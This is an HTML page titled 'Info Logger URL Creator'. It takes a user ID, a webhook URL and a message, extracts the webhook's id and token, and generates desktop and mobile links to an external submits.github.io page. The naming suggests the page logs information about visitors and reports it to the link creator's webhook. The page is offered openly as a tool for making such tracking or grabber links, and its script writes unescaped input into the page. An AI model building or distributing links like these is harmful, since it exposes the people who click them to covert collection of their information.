<!DOCTYPE HTML>

<html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
        <title>trolled</title>
        <link href="https://fonts.googleapis.com/css?family=Ubuntu" rel="stylesheet">
        <style>
    @font-face {
  font-family: 'Ubuntu';
  font-style: normal;
  font-weight: 400;
  src: url(https://fonts.gstatic.com/s/ubuntu/v15/4iCs6KVjbNBYlgoKcg72j00.woff2) format('woff2');
  unicode-range: U+0460-052F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
}
      
    </style>

    </head>
    <body>
        <div style="text-align:center">
    <h1 style="font-family:'Ubuntu'">Info Logger URL Creator</h1>
            <label style="font-family:'Ubuntu'; font-size:23px">User ID To Ping</label><br>
            <input style = "width:250px; height:25px; font-family:'Ubuntu'"type="text" id="userid"><br><br>
            <label style="font-family:'Ubuntu'; font-size:23px">Webhook URL</label><br>
            <input style = "width:650px; height:25px; font-family:'Ubuntu'"type="text" id="webhookurl"><br><br>
            <label style="font-family:'Ubuntu'; font-size:23px">Message To Display</label><br>
            <input style = "width:350px; height:25px; font-family:'Ubuntu'"type="text" id="message"><br><br><br>
            <button onclick="generate()" style="width:250px; height:30px; font-family:'Ubuntu'; cursor:pointer">Generate</button><br><br>
            <label id="finalurl" style="font-family:'Ubuntu'; font-size:18px">URL will appear here.</label><br>
        </div>
    </body>
    <script>
function generate(){
    let webhookurl =  document.getElementById("webhookurl").value
    var components = webhookurl.split("/")
    let url = "https://submits.github.io/?" + document.getElementById("userid").value + "?" + components[5] + "?" + components[6] + "?" + document.getElementById("message").value.replace(/\s/g, "%20")
    document.getElementById("finalurl").innerHTML = "<b>Desktop:\<b> <a href=\"" + url + "\">" + url + "</a><br>" + "<b>Mobile:\<b> <a href=\"" + url + "?mobile" + "\">" + url + "?mobile" + "</a>"
}
    </script>
</html>
